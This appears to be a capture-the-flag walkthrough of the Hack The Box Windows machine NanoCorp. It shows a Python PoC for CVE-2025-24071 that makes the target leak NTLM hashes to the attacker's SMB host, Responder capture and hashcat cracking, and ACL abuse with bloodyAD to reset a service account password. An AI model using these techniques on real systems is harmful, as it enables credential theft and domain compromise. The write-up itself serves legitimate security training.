---
maquina: "NanoCorp"
dificultad: "Hard"
os: "Windows"
plataforma: "htb"
release: "08 Nov 2025"
retire: "20 Jun 2026"
creadores: "EmSec"
htb_url: "https://hackthebox.com/machines/nanocorp"
app_url: "https://app.hackthebox.com/machines/802"
url: "https://0xdf.gitlab.io/2026/06/20/htb-nanocorp.html"
tipo: "htb"
en_lista_oscp: false
oscp_seccion: ""
---

NanoCorp is a Windows Active Directory machine built around a careers portal that accepts uploaded application archives. I’ll craft a malicious archive that leaks a service account’s authentication to my host when an automated job extracts it, and crack the result to get a foothold. With BloodHound, I’ll map a permissions chain that lets me add my user to a support group and then reset a second service account’s password. That account sits in the Protected Users group, so I’ll authenticate over Kerberos to get a shell. From there, I’ll find the Checkmk monitoring agent installed and abuse CVE-2024-0670 to drop write-protected files into a temp directory that the agent runs as SYSTEM, taking full control of the host. In Beyond Root, I’ll dig into the scheduled automations that keep the box in its intended state.

## Recon

### Initial Scanning

`nmap` finds 20 open TCP ports:

```console
oxdf@hacky$ sudo nmap -p- --reason --min-rate 10000 10.129.243.199
Starting Nmap 7.94SVN ( https://nmap.org ) at 2026-06-11 21:42 UTC
Nmap scan report for 10.129.243.199
Host is up, received echo-reply ttl 127 (0.020s latency).
Not shown: 65515 filtered tcp ports (no-response)
PORT      STATE SERVICE          REASON
53/tcp    open  domain           syn-ack ttl 127
80/tcp    open  http             syn-ack ttl 127
88/tcp    open  kerberos-sec     syn-ack ttl 127
135/tcp   open  msrpc            syn-ack ttl 127
139/tcp   open  netbios-ssn      syn-ack ttl 127
389/tcp   open  ldap             syn-ack ttl 127
445/tcp   open  microsoft-ds     syn-ack ttl 127
464/tcp   open  kpasswd5         syn-ack ttl 127
593/tcp   open  http-rpc-epmap   syn-ack ttl 127
636/tcp   open  ldapssl          syn-ack ttl 127
3268/tcp  open  globalcatLDAP    syn-ack ttl 127
3269/tcp  open  globalcatLDAPssl syn-ack ttl 127
5986/tcp  open  wsmans           syn-ack ttl 127
9389/tcp  open  adws             syn-ack ttl 127
49664/tcp open  unknown          syn-ack ttl 127
49668/tcp open  unknown          syn-ack ttl 127
61162/tcp open  unknown          syn-ack ttl 127
61167/tcp open  unknown          syn-ack ttl 127
61189/tcp open  unknown          syn-ack ttl 127
63772/tcp open  unknown          syn-ack ttl 127

Nmap done: 1 IP address (1 host up) scanned in 13.37 seconds
oxdf@hacky$ sudo nmap -p 53,80,88,135,139,389,445,464,593,636,3268,3269,5986,9389,49664,49668,61162,61167,61189,63772 -sCV 10.129.243.199
Starting Nmap 7.94SVN ( https://nmap.org ) at 2026-06-11 21:45 UTC
Nmap scan report for 10.129.243.199
Host is up (0.020s latency).

PORT      STATE SERVICE           VERSION
53/tcp    open  domain            Simple DNS Plus
80/tcp    open  http              Apache httpd 2.4.58 (OpenSSL/3.1.3 PHP/8.2.12)
|_http-title: Did not follow redirect to http://nanocorp.htb/
|_http-server-header: Apache/2.4.58 (Win64) OpenSSL/3.1.3 PHP/8.2.12
88/tcp    open  kerberos-sec      Microsoft Windows Kerberos (server time: 2026-06-12 04:43:59Z)
135/tcp   open  msrpc             Microsoft Windows RPC
139/tcp   open  netbios-ssn       Microsoft Windows netbios-ssn
389/tcp   open  ldap              Microsoft Windows Active Directory LDAP (Domain: nanocorp.htb0., Site: Default-First-Site-Name)
445/tcp   open  microsoft-ds?
464/tcp   open  kpasswd5?
593/tcp   open  ncacn_http        Microsoft Windows RPC over HTTP 1.0
636/tcp   open  ldapssl?
3268/tcp  open  ldap              Microsoft Windows Active Directory LDAP (Domain: nanocorp.htb0., Site: Default-First-Site-Name)
3269/tcp  open  globalcatLDAPssl?
5986/tcp  open  ssl/http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
| ssl-cert: Subject: commonName=dc01.nanocorp.htb
| Subject Alternative Name: DNS:dc01.nanocorp.htb
| Not valid before: 2025-04-06T22:58:43
|_Not valid after:  2026-04-06T23:18:43
| tls-alpn:
|_  http/1.1
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
|_ssl-date: TLS randomness does not represent time
9389/tcp  open  mc-nmf            .NET Message Framing
49664/tcp open  msrpc             Microsoft Windows RPC
49668/tcp open  msrpc             Microsoft Windows RPC
61162/tcp open  ncacn_http        Microsoft Windows RPC over HTTP 1.0
61167/tcp open  msrpc             Microsoft Windows RPC
61189/tcp open  msrpc             Microsoft Windows RPC
63772/tcp open  msrpc             Microsoft Windows RPC
Service Info: Hosts: nanocorp.htb, DC01; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| smb2-security-mode:
|   3:1:1:
|_    Message signing enabled and required
| smb2-time:
|   date: 2026-06-12T04:44:49
|_  start_date: N/A
|_clock-skew: 6h58m42s

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 97.75 seconds
```

The box shows many of the ports associated with a [Windows Domain Controller](https://0xdf.gitlab.io/cheatsheets/os#windows-domain-controller). The domain is `nanocorp.htb`, and the hostname is `DC01`.

I’ll use `netexec` to make a `hosts` file entry and put it at the top of my `/etc/hosts` file:

```console
oxdf@hacky$ netexec smb 10.129.243.199 --generate-hosts-file hosts
SMB         10.129.243.199  445    DC01             [*] Windows Server 2022 Build 20348 x64 (name:DC01) (domain:nanocorp.htb) (signing:True) (SMBv1:None) (Null Auth:True)
oxdf@hacky$ cat hosts /etc/hosts | sudo tee /etc/hosts | head -1
10.129.243.199     DC01.nanocorp.htb nanocorp.htb DC01
```

All of the ports show a TTL of 127, which matches the [expected TTL](https://0xdf.gitlab.io/cheatsheets/os#os-identification) for Windows one hop away.

`nmap` notes a clock skew, so I’ll want to make sure to run `sudo ntpdate DC01.nanocorp.htb` before any actions that use Kerberos auth.

The webserver shows Apache with PHP. There’s also a redirect to `nanocorp.htb`. I’ll use `ffuf` to bruteforce for subdomains that respond differently, but not find any.

I’ll rescan port 80 with the hostname, but not find anything interesting.

### SMB - TCP 445

I’m not able to authenticate as a guest or anonymously:

```console
oxdf@hacky$ netexec smb DC01.nanocorp.htb -u guest -p ''
SMB         10.129.243.199  445    DC01             [*] Windows Server 2022 Build 20348 x64 (name:DC01) (domain:nanocorp.htb) (signing:True) (SMBv1:None) (Null Auth:True)
SMB         10.129.243.199  445    DC01             [-] nanocorp.htb\guest: STATUS_ACCOUNT_DISABLED
oxdf@hacky$ netexec smb DC01.nanocorp.htb -u 0xdf -p ''
SMB         10.129.243.199  445    DC01             [*] Windows Server 2022 Build 20348 x64 (name:DC01) (domain:nanocorp.htb) (signing:True) (SMBv1:None) (Null Auth:True)
SMB         10.129.243.199  445    DC01             [-] nanocorp.htb\0xdf: STATUS_LOGON_FAILURE
```

I’ll have to come back when I get creds.

### LDAP - TCP 389

`netexec` shows the same hostname and version, but it also checks for signing and channel binding:

```console
oxdf@hacky$ netexec ldap DC01.nanocorp.htb
LDAP        10.129.243.199  389    DC01             [*] Windows Server 2022 Build 20348 (name:DC01) (domain:nanocorp.htb) (signing:None) (channel binding:No TLS cert)
```

- `signing:None` - the DC does not require LDAP signing. Unsigned LDAP binds are accepted.
- `channel binding:No TLS cert` - there’s no LDAPS channel-binding (EPA) enforcement either.

Together, those mean the DC is vulnerable to NTLM relay to LDAP. With signing not required and channel binding not enforced, an attacker who can coerce or capture an authentication can relay that NTLM auth straight to LDAP and have it accepted. There was an unintended path here, but I believe it was [patched](https://app.hackthebox.com/machines/NanoCorp?tab=changelog) just over a week after release:

![image-20260616101351062](https://pub-4caceed5c57c4466b559b0834d2806c9.r2.dev/img/image-20260616101351062.png)

### nanocorp.htb - TCP 80

#### Site

The site is for a cyber security company:

![image-20260611180018053](https://pub-4caceed5c57c4466b559b0834d2806c9.r2.dev/img/image-20260611180018053.png)

Each of the four squares pop up information. The “About Us” one has a link to `hire.nanocorp.htb`:

![image-20260611180250472](https://pub-4caceed5c57c4466b559b0834d2806c9.r2.dev/img/image-20260611180250472.png)

I’ll add this to my `hosts` file:

```plaintext
10.129.243.199     DC01.nanocorp.htb nanocorp.htb DC01 hire.nanocorp.htb
```

The “Contact Us” one has a form:

![image-20260611180327590](https://pub-4caceed5c57c4466b559b0834d2806c9.r2.dev/img/image-20260611180327590.png)

Submitting the form sends a POST to `/index.html`, which suggests it does nothing.

#### Tech Stack

This feels like a static site. The HTTP response headers show just Apache:

```http
HTTP/1.1 200 OK
Date: Fri, 12 Jun 2026 04:58:35 GMT
Server: Apache/2.4.58 (Win64) OpenSSL/3.1.3 PHP/8.2.12
Last-Modified: Thu, 10 Apr 2025 06:27:08 GMT
ETag: "3f54-63266acdf17c3"
Accept-Ranges: bytes
Content-Length: 16212
Keep-Alive: timeout=5, max=100
Connection: Keep-Alive
Content-Type: text/html
```

The main page loads as both `/` and `/index.html`.

The 404 page is the [default Apache 404](https://0xdf.gitlab.io/cheatsheets/404#apache--httpd), but it does show that PHP is installed and running:

![image-20260611180527302](https://pub-4caceed5c57c4466b559b0834d2806c9.r2.dev/img/image-20260611180527302.png)

This is likely the [XAMPP for Windows stack](https://www.apachefriends.org/download.html).

#### Directory Brute Force

I’ll run `feroxbuster` against the site, and include `-x html,php` as there are `.html` pages, and the headers indicate that PHP could be enabled. I’ll also use a lowercase wordlist as Windows typically isn’t case sensitive:

```console
oxdf@hacky$ feroxbuster -u http://nanocorp.htb -x html,php -w /opt/SecLists/Discovery/Web-Content/raft-medium-directories-lowercase.txt --dont-extract-links

 ___  ___  __   __     __      __         __   ___
|__  |__  |__) |__) | /  `    /  \ \_/ | |  \ |__
|    |___ |  \ |  \ | \__,    \__/ / \ | |__/ |___
by Ben "epi" Risher 🤓                 ver: 2.11.0
───────────────────────────┬──────────────────────
 🎯  Target Url            │ http://nanocorp.htb
 🚀  Threads               │ 50
 📖  Wordlist              │ /opt/SecLists/Discovery/Web-Content/raft-medium-directories-lowercase.txt
 👌  Status Codes          │ All Status Codes!
 💥  Timeout (secs)        │ 7
 🦡  User-Agent            │ feroxbuster/2.11.0
 💲  Extensions            │ [html, php]
 🏁  HTTP methods          │ [GET]
 🔃  Recursion Depth       │ 4
 🎉  New Version Available │ https://github.com/epi052/feroxbuster/releases/latest
───────────────────────────┴──────────────────────
 🏁  Press [ENTER] to use the Scan Management Menu™
──────────────────────────────────────────────────
404      GET        9l       33w      298c Auto-filtering found 404-like response and created new filter; toggle off with --dont-filter
403      GET        9l       30w      301c Auto-filtering found 404-like response and created new filter; toggle off with --dont-filter
200      GET      229l      670w    16212c http://nanocorp.htb/
301      GET        9l       30w      333c http://nanocorp.htb/js => http://nanocorp.htb/js/
301      GET        9l       30w      334c http://nanocorp.htb/img => http://nanocorp.htb/img/
301      GET        9l       30w      334c http://nanocorp.htb/css => http://nanocorp.htb/css/
200      GET      229l      670w    16212c http://nanocorp.htb/index.html
503      GET       11l       44w      401c http://nanocorp.htb/examples
403      GET       11l       47w      420c http://nanocorp.htb/licenses
403      GET       11l       47w      420c http://nanocorp.htb/server-status
403      GET       11l       47w      420c http://nanocorp.htb/server-info
[####################] - 56s   319008/319008  0s      found:9       errors:0
[####################] - 56s    79752/79752   1435/s  http://nanocorp.htb/
[####################] - 0s     79752/79752   2416727/s http://nanocorp.htb/js/ => Directory listing (add --scan-dir-listings to scan) (remove --dont-extract-links to scan)
[####################] - 0s     79752/79752   1476889/s http://nanocorp.htb/img/ => Directory listing (add --scan-dir-listings to scan) (remove --dont-extract-links to scan)
[####################] - 0s     79752/79752   2848286/s http://nanocorp.htb/css/ => Directory listing (add --scan-dir-listings to scan) (remove --dont-extract-links to scan)
```

`/examples` is returning 503, which suggests it’s being proxied to something that is dead. `/server-status` and `/server-info` are standard Apache pages (`mod_status` and `mod_info`) that are typically blocked when not coming from localhost.

`/licenses` is returning 403 and is explicitly blocked in `httpd-xampp.conf` ([source](https://gist.github.com/yackermann/364490075d2f54eb8bfe)):

```xml
<LocationMatch "^/(?i:(?:xampp|security|licenses|phpmyadmin|webalizer|server-status|server-info))">
        Allow from all
	ErrorDocument 403 /error/XAMPP_FORBIDDEN.html.var
</LocationMatch>
```

Though this isn’t the exact one on NanoCorp because others on that list do not return 403:

| Path | Response Code |
|---|---|
| `/xampp` | 404 |
| `/security` | 404 |
| `/licenses` | 403 |
| `/phpmyadmin` | 403 |
| `/webalizer` | 403 |
| `/server-status` | 403 |
| `/server-info` | 403 |

### hire.nanocorp.htb

#### Site

The site presents a form to apply for a position:

![image-20260615104625386](https://pub-4caceed5c57c4466b559b0834d2806c9.r2.dev/img/image-20260615104625386.png)

If I fill out the form (including creating a fake Zip archive), it reports success:

![image-20260615115326500](https://pub-4caceed5c57c4466b559b0834d2806c9.r2.dev/img/image-20260615115326500.png)

If I try with a text doc renamed to `test.zip`, it fails:

![image-20260615115426648](https://pub-4caceed5c57c4466b559b0834d2806c9.r2.dev/img/image-20260615115426648.png)

So it must be doing some magic checking or returning this once it fails to decompress.

#### Tech Stack

The HTTP response headers show the same thing as the main site:

```http
HTTP/1.1 200 OK
Date: Mon, 15 Jun 2026 21:45:56 GMT
Server: Apache/2.4.58 (Win64) OpenSSL/3.1.3 PHP/8.2.12
Last-Modified: Fri, 11 Apr 2025 17:38:46 GMT
ETag: "9d8-632842ca46aae"
Accept-Ranges: bytes
Content-Length: 2520
Keep-Alive: timeout=5, max=100
Connection: Keep-Alive
Content-Type: text/html
```

The main page loads as both `/` and `/index.html`, but the POST request goes to `/upload.php`, and that leads to a redirect to `/success.php`, so this is a PHP site.

The 404 page is the default Apache 404:

![image-20260615115616581](https://pub-4caceed5c57c4466b559b0834d2806c9.r2.dev/img/image-20260615115616581.png)

#### Directory Brute Force

I’ll run `feroxbuster` against the site with the same parameters as above:

```console
oxdf@hacky$ feroxbuster -u http://hire.nanocorp.htb -x php,html -w /opt/SecLists/Discovery/Web-Content/raft-medium-directories-lowercase.txt --dont-extract-links

 ___  ___  __   __     __      __         __   ___
|__  |__  |__) |__) | /  `    /  \ \_/ | |  \ |__
|    |___ |  \ |  \ | \__,    \__/ / \ | |__/ |___
by Ben "epi" Risher 🤓                 ver: 2.11.0
───────────────────────────┬──────────────────────
 🎯  Target Url            │ http://hire.nanocorp.htb
 🚀  Threads               │ 50
 📖  Wordlist              │ /opt/SecLists/Discovery/Web-Content/raft-medium-directories-lowercase.txt
 👌  Status Codes          │ All Status Codes!
 💥  Timeout (secs)        │ 7
 🦡  User-Agent            │ feroxbuster/2.11.0
 💲  Extensions            │ [php, html]
 🏁  HTTP methods          │ [GET]
 🔃  Recursion Depth       │ 4
 🎉  New Version Available │ https://github.com/epi052/feroxbuster/releases/latest
───────────────────────────┴──────────────────────
 🏁  Press [ENTER] to use the Scan Management Menu™
──────────────────────────────────────────────────
403      GET        9l       30w      306c Auto-filtering found 404-like response and created new filter; toggle off with --dont-filter
404      GET        9l       33w      303c Auto-filtering found 404-like response and created new filter; toggle off with --dont-filter
301      GET        9l       30w      347c http://hire.nanocorp.htb/images => http://hire.nanocorp.htb/images/
200      GET       67l      179w     2520c http://hire.nanocorp.htb/
301      GET        9l       30w      347c http://hire.nanocorp.htb/assets => http://hire.nanocorp.htb/assets/
200      GET        0l        0w        0c http://hire.nanocorp.htb/upload.php
200      GET       67l      179w     2520c http://hire.nanocorp.htb/index.html
302      GET        0l        0w        0c http://hire.nanocorp.htb/success.php => index.html
503      GET       11l       44w      406c http://hire.nanocorp.htb/examples
403      GET       11l       47w      425c http://hire.nanocorp.htb/licenses
403      GET       11l       47w      425c http://hire.nanocorp.htb/server-status
403      GET       11l       47w      425c http://hire.nanocorp.htb/server-info
[####################] - 50s   239256/239256  0s      found:10      errors:0
[####################] - 49s    79752/79752   1615/s  http://hire.nanocorp.htb/
[####################] - 0s     79752/79752   2044923/s http://hire.nanocorp.htb/images/ => Directory listing (add --scan-dir-listings to scan) (remove --dont-extract-links to scan)
[####################] - 0s     79752/79752   1993800/s http://hire.nanocorp.htb/assets/ => Directory listing (add --scan-dir-listings to scan) (remove --dont-extract-links to scan)
```

Nothing I haven’t seen already.

## Auth as web_svc

### Recover Net-NTLMv2

#### CVE-2025-24071 Background

Given that I have a Windows server clearly decompressing a Zip file, [CVE-2025-24071](https://nvd.nist.gov/vuln/detail/CVE-2025-24071) seems like a good fit. The NIST description isn’t super helpful:

> Exposure of sensitive information to an unauthorized actor in Windows File Explorer allows an unauthorized attacker to perform spoofing over a network.

[This blog post](https://cti.monster/blog/2025/03/18/CVE-2025-24071.html) titled “CVE-2025-24071: NTLM Hash Leak via RAR/ZIP Extraction and .library-ms File” makes it sound like a really good fit! VSociety [offers a POC](https://www.vicarius.io/vsociety/posts/cve-2025-24071-spoofing-vulnerability-in-microsoft-windows-file-explorer-detection-scrip).

[HTB Fluffy](https://0xdf.gitlab.io/2025/09/20/htb-fluffy.html#cve-2025-24071--cve-2025-24054) exploited this same vulnerability in a similar situation, just with the `.library-ms` file being uploaded to an SMB share rather than a website in an archive.

#### Build Exploit

I’ll grab a POC from GitHub. [This one](https://github.com/LOOKY243/CVE-2025-24071-PoC) specifically calls out extraction from an archive. The code is very straight forward, building a `.library-ms` file, and then putting it in a zip archive:

```python
import argparse
import os
import zipfile

def zip_file(filename):
    zip_name = filename + ".zip"

    with zipfile.ZipFile(zip_name, 'w', zipfile.ZIP_DEFLATED) as zipf:
        zipf.write(f"{filename}.library-ms", arcname=f"{filename}.library-ms")
    os.remove(f"{filename}.library-ms")
    print(f"[+] Zipped file saved as: {zip_name}")

def generate_file(smb_path, filename):
    content = f"""<?xml version="1.0" encoding="UTF-8"?>
<libraryDescription xmlns="http://schemas.microsoft.com/windows/2009/library">
  <searchConnectorDescriptionList>
    <searchConnectorDescription>
      <simpleLocation>
        <url>{smb_path}</url>
      </simpleLocation>
    </searchConnectorDescription>
  </searchConnectorDescriptionList>
</libraryDescription>"""

    with open(filename + '.library-ms', "w") as file:
        file.write(content)
    print("[+] Created {filename}.library-ms file")

def main():
    parser = argparse.ArgumentParser()
    parser.add_argument('-i', '--ip', required=True, help='Target IP address (e.g 10.10.10.10)')
    parser.add_argument('-f', '--filename', default='payload', help='Filename without the extension')
    parser.add_argument('-s', '--share', default='share', help='Name of your local smb share')

    args = parser.parse_args()

    print("[+] Crafting malicious .library-ms file:")

    smb_path = f"\\\\{args.ip}\\{args.share}\\"
    generate_file(smb_path, args.filename)
    zip_file(args.filename)

if __name__ == '__main__':
    main()
```

I’ll run it to generate a file:

```console
oxdf@hacky$ uv run exploit.py -i 10.10.14.51 -f 0xdf
[+] Crafting malicious .library-ms file:
[+] Created {filename}.library-ms file
[+] Zipped file saved as: 0xdf.zip
```

The output has a broken f-string, but it works just fine:

```console
oxdf@hacky$ unzip -l 0xdf.zip
Archive:  0xdf.zip
  Length      Date    Time    Name
---------  ---------- -----   ----
      364  2026-06-15 20:51   0xdf.library-ms
---------                     -------
      364                     1 file
```

#### Capture Net-NTLM-v2

I’ll upload the zip via the web form, and start [Responder](https://github.com/lgandx/Responder). After a minute or two, I get a hit:

```console
oxdf@hacky$ sudo uv run Responder.py -I tun0
...[snip]...
[+] Listening for events...

[SMB] NTLMv2-SSP Client   : 10.129.243.199
[SMB] NTLMv2-SSP Username : NANOCORP\web_svc
[SMB] NTLMv2-SSP Hash     : web_svc::NANOCORP:99c66f06671506e5:EECF77811F17B8DB2AAAF12BE949FAEA:010100000000000000B5BBA706FDDC01A662DD4F9ADA40B60000000002000800380050004C00590001001E00570049004E002D0047004D005A00340041004D004900350057004D00510004003400570049004E002D0047004D005A00340041004D004900350057004D0051002E00380050004C0059002E004C004F00430041004C0003001400380050004C0059002E004C004F00430041004C0005001400380050004C0059002E004C004F00430041004C000700080000B5BBA706FDDC0106000400020000000800300030000000000000000000000000200000493B692961B3D79EF1BF82C720D372FC2938F71A16A60DBAD6246AA73768F30E0A001000000000000000000000000000000000000900200063006900660073002F00310030002E00310030002E00310034002E00350031000000000000000000
[*] Skipping previously captured hash for NANOCORP\web_svc
[*] Skipping previously captured hash for NANOCORP\web_svc
[*] Skipping previously captured hash for NANOCORP\web_svc
[*] Skipping previously captured hash for NANOCORP\web_svc
[*] Skipping previously captured hash for NANOCORP\web_svc
[*] Skipping previously captured hash for NANOCORP\web_svc
```

### Crack Password

I’ll pass the hash to `hashcat`, and it auto-detects the format, and cracks it within a couple seconds:

```console
$ hashcat web_svc.hash /opt/SecLists/Passwords/Leaked-Databases/rockyou.txt
hashcat (v7.1.2) starting in autodetect mode
...[snip]...
Hash-mode was not specified with -m. Attempting to auto-detect hash mode.
The following mode was auto-detected as the only one matching your input hash:

5600 | NetNTLMv2 | Network Protocol
...[snip]...
WEB_SVC::NANOCORP:99c66f06671506e5:eecf77811f17b8db2aaaf12be949faea:010100000000000000b5bba706fddc01a662dd4f9ada40b60000000002000800380050004c00590001001e00570049004e002d0047004d005a00340041004d004900350057004d00510004003400570049004e002d0047004d005a00340041004d004900350057004d0051002e00380050004c0059002e004c004f00430041004c0003001400380050004c0059002e004c004f00430041004c0005001400380050004c0059002e004c004f00430041004c000700080000b5bba706fddc0106000400020000000800300030000000000000000000000000200000493b692961b3d79ef1bf82c720d372fc2938f71a16a60dbad6246aa73768f30e0a001000000000000000000000000000000000000900200063006900660073002f00310030002e00310030002e00310034002e00350031000000000000000000:dksehdgh712!@#
...[snip]...
```

I’ll validate the creds:

```console
oxdf@hacky$ netexec smb nanocorp.htb -u web_svc -p 'dksehdgh712!@#'
SMB         10.129.243.199  445    DC01             [*] Windows Server 2022 Build 20348 x64 (name:DC01) (domain:nanocorp.htb) (signing:True) (SMBv1:None) (Null Auth:True)
SMB         10.129.243.199  445    DC01             [+] nanocorp.htb\web_svc:dksehdgh712!@#
```

## Shell as monitoring_svc

### Enumeration

#### SMB - TCP 445

With creds, I’ll come back to SMB and list shares:

```console
oxdf@hacky$ netexec smb nanocorp.htb -u web_svc -p 'dksehdgh712!@#' --shares
SMB         10.129.243.199  445    DC01             [*] Windows Server 2022 Build 20348 x64 (name:DC01) (domain:nanocorp.htb) (signing:True) (SMBv1:None) (Null Auth:True)
SMB         10.129.243.199  445    DC01             [+] nanocorp.htb\web_svc:dksehdgh712!@#
SMB         10.129.243.199  445    DC01             [*] Enumerated shares
SMB         10.129.243.199  445    DC01             Share           Permissions     Remark
SMB         10.129.243.199  445    DC01             -----           -----------     ------
SMB         10.129.243.199  445    DC01             ADMIN$                          Remote Admin
SMB         10.129.243.199  445    DC01             C$                              Default share
SMB         10.129.243.199  445    DC01             IPC$            READ            Remote IPC
SMB         10.129.243.199  445    DC01             NETLOGON        READ            Logon server share
SMB         10.129.243.199  445    DC01             SYSVOL          READ            Logon server share
```

These are the default shares for a DC. There’s nothing interesting on them.

I’ll list users:

```console
oxdf@hacky$ netexec smb nanocorp.htb -u web_svc -p 'dksehdgh712!@#' --users
SMB         10.129.243.199  445    DC01             [*] Windows Server 2022 Build 20348 x64 (name:DC01) (domain:nanocorp.htb) (signing:True) (SMBv1:None) (Null Auth:True)
SMB         10.129.243.199  445    DC01             [+] nanocorp.htb\web_svc:dksehdgh712!@#
SMB         10.129.243.199  445    DC01             -Username-                    -Last PW Set-       -BadPW- -Description-
SMB         10.129.243.199  445    DC01             Administrator                 2025-04-09 23:00:49 0       Built-in account for administering the computer/domain
SMB         10.129.243.199  445    DC01             Guest                         <never>             0       Built-in account for guest access to the computer/domain
SMB         10.129.243.199  445    DC01             krbtgt                        2025-04-03 01:38:45 0       Key Distribution Center Service Account
SMB         10.129.243.199  445    DC01             web_svc                       2025-04-09 22:59:38 0
SMB         10.129.243.199  445    DC01             monitoring_svc                2026-06-16 05:28:55 0
SMB         10.129.243.199  445    DC01             [*] Enumerated 5 local users: NANOCORP
```

monitoring_svc is another potential target account. I could do a RID-brute force, but I’ll just move on to BloodHound data.

#### BloodHound

I’ll use `netexec` to collect BloodHound data:

```console
oxdf@hacky$ netexec ldap nanocorp.htb -u web_svc -p 'dksehdgh712!@#' --dns-server 10.129.243.199 --bloodhound -c all
LDAP        10.129.243.199  389    DC01             [*] Windows Server 2022 Build 20348 (name:DC01) (domain:nanocorp.htb) (signing:None) (channel binding:No TLS cert)
LDAP        10.129.243.199  389    DC01             [+] nanocorp.htb\web_svc:dksehdgh712!@#
LDAP        10.129.243.199  389    DC01             Resolved collection methods: localadmin, objectprops, trusts, session, rdp, container, psremote, acl, group, dcom
LDAP        10.129.243.199  389    DC01             Done in 0M 4S
LDAP        10.129.243.199  389    DC01             Compressing output into /home/oxdf/.nxc/logs/DC01_10.129.243.199_2026-06-15_223616_bloodhound.zip
```

I’ll upload the data and take a look at web_svc, marking it as owned. It has one item under Outbound Control, the ability to add members to the IT_Support group:

![image-20260615184131936](https://pub-4caceed5c57c4466b559b0834d2806c9.r2.dev/img/image-20260615184131936.png)

The IT_Support group has one item under Outbound Control as well, ForceChangePassword over monitoring_svc, which means anyone in IT_Support can reset that account’s password:

![image-20260615184211405](https://pub-4caceed5c57c4466b559b0834d2806c9.r2.dev/img/image-20260615184211405.png)

monitoring_svc doesn’t have any Outbound Control, but it is a member of the Remote Management Users group:

![image-20260615184256211](https://pub-4caceed5c57c4466b559b0834d2806c9.r2.dev/img/image-20260615184256211.png)

This means access to it will provide a shell. This account is also in the Protected Users group, which means I won’t be able to use NTLM to authenticate as this user.

### Auth as monitoring_svc

#### Reset Password

I’ll add the web_svc user to the IT_Support group using `bloodyAD`:

```console
oxdf@hacky$ bloodyAD --host dc01.nanocorp.htb -u web_svc -p 'dksehdgh712!@#' add groupMember IT_Support web_svc
[+] web_svc added to IT_Support
```

Now I’ll reset the monitoring_svc user’s password:

```console
oxdf@hacky$ bloodyAD --host dc01.nanocorp.htb -u web_svc -p 'dksehdgh712!@#' set password monitoring_svc '0xdf0xdf.'
[+] Password changed successfully!
```

#### Kerberos Access

If I try to validate the creds, the account returns that it’s restricted (as expected):

```console
oxdf@hacky$ netexec smb DC01.nanocorp.htb -u monitoring_svc -p 0xdf0xdf.
SMB         10.129.243.199  445    DC01             [*] Windows Server 2022 Build 20348 x64 (name:DC01) (domain:nanocorp.htb) (signing:True) (SMBv1:None) (Null Auth:True)
SMB         10.129.243.199  445    DC01             [-] nanocorp.htb\monitoring_svc:0xdf0xdf STATUS_ACCOUNT_RESTRICTION
```

I’ll make sure to `sudo ntpdate DC01.nanocorp.htb`, and then adding `-k` fixes it:

```console
oxdf@hacky$ netexec smb DC01.nanocorp.htb -u monitoring_svc -p 0xdf0xdf. -k
SMB         DC01.nanocorp.htb 445    DC01             [*] Windows Server 2022 Build 20348 x64 (name:DC01) (domain:nanocorp.htb) (signing:True) (SMBv1:None) (Null Auth:True)
SMB         DC01.nanocorp.htb 445    DC01             [+] nanocorp.htb\monitoring_svc:0xdf0xdf.
```

### Shell

I’ll create a `krb5.conf` file using `netexec`:

```console
oxdf@hacky$ netexec smb nanocorp.htb -u web_svc -p 'dksehdgh712!@#' --generate-krb5-file krb5.conf
SMB         10.129.243.199  445    DC01             [*] Windows Server 2022 Build 20348 x64 (name:DC01) (domain:nanocorp.htb) (signing:True) (SMBv1:None) (Null Auth:True)
SMB         10.129.243.199  445    DC01             [+] krb5 conf saved to: krb5.conf
SMB         10.129.243.199  445    DC01             [+] Run the following command to use the conf file: export KRB5_CONFIG=krb5.conf
SMB         10.129.243.199  445    DC01             [+] nanocorp.htb\web_svc:dksehdgh712!@#
oxdf@hacky$ sudo cp krb5.conf /etc/krb5.conf
```

And now I can [evil-winrm-py](https://github.com/adityatelange/evil-winrm-py):

```console
oxdf@hacky$ evil-winrm-py -i DC01.nanocorp.htb -u monitoring_svc -p 0xdf0xdf. -k --ssl
          _ _            _
  _____ _(_| |_____ __ _(_)_ _  _ _ _ __ ___ _ __ _  _
 / -_\ V | | |___\ V  V | | ' \| '_| '  |___| '_ | || |
 \___|\_/|_|_|    \_/\_/|_|_||_|_| |_|_|_|  | .__/\_, |
                                            |_|   |__/  v1.6.0

[*] Connecting to 'DC01.nanocorp.htb:5986' as 'monitoring_svc'
evil-winrm-py PS C:\Users\monitoring_svc\Documents>
```

I’m using the `--ssl` flag because 5986 is open, not 5985.

I’ll grab `user.txt`:

```console
evil-winrm-py PS C:\Users\monitoring_svc\Desktop> cat user.txt
b08297a9************************
```

## Shell as Administrator

### Enumeration

#### Users

The monitoring_svc home directory is empty:

```console
evil-winrm-py PS C:\Users\monitoring_svc> tree /f
Folder PATH listing
Volume serial number is 2EB6-7759
C:.
+---Desktop
¦       user.txt
¦
+---Documents
+---Downloads
+---Favorites
+---Links
+---Music
+---Pictures
+---Saved Games
+---Videos
```

web_svc does have a home directory:

```console
evil-winrm-py PS C:\Users> ls

    Directory: C:\Users

Mode                 LastWriteTime         Length Name
----                 -------------         ------ ----
d-----         4/12/2025   1:45 PM                Administrator
d-----          4/9/2025   6:19 PM                monitoring_svc
d-r---          4/2/2025   6:22 PM                Public
d-----         4/12/2025   1:40 PM                web_svc
```

I’ll later be able to see there’s nothing interesting in there other than the CVE-2025-24071 automation, which I’ll look at in Beyond Root.

#### Filesystem

The root of the drive is as expected:

```console
evil-winrm-py PS C:\> ls

    Directory: C:\

Mode                 LastWriteTime         Length Name
----                 -------------         ------ ----
d-----         11/3/2025   4:13 PM                inetpub
d-----          5/8/2021   1:20 AM                PerfLogs
d-r---          4/2/2025   6:35 PM                Program Files
d-----          4/5/2025   4:17 PM                Program Files (x86)
d-r---          4/9/2025   6:19 PM                Users
d-----         11/3/2025   4:18 PM                Windows
d-----          4/5/2025  10:59 AM                xampp
```

The web files are in `xampp`. There’s the `hire` site:

```console
evil-winrm-py PS C:\> ls xampp\htdocs\hire

    Directory: C:\xampp\htdocs\hire

Mode                 LastWriteTime         Length Name
----                 -------------         ------ ----
d-----          4/5/2025  10:58 AM                assets
d-----          4/5/2025  10:58 AM                images
